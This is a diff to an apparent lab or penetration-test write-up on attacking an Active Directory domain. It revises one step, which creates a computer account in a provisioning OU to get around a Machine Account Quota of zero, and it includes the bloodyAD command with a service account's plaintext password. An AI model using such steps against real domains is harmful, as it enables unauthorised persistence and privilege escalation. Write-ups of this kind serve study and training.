@@ -181,7 +181,7 @@ The bloodhound result also shows that there are 4 different Tier 1 accounts we c
 
 ![2bde3a2be56d730a61a18d4bd0fd5b5d.png](/resources/2bde3a2be56d730a61a18d4bd0fd5b5d.png)
 
-I will create a new computer account name "backup" and add to the `OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp` OU to make it more stealthy as we know that the PowerScript script we found from `Scripts` folder will create computer accounts and adding them to this OU
+I will create a new computer account name "backup" and add to the `OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp` OU to make it bypass Machine Account Quota that was set to 0
 
 ```
 bloodyAD --host NORTHDC01 -d northbridge.corp -u _svrautomationsvc -p 'yf0@EoWY4cXqmVv' add computer 'backup' 'password123' --ou 'OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp'
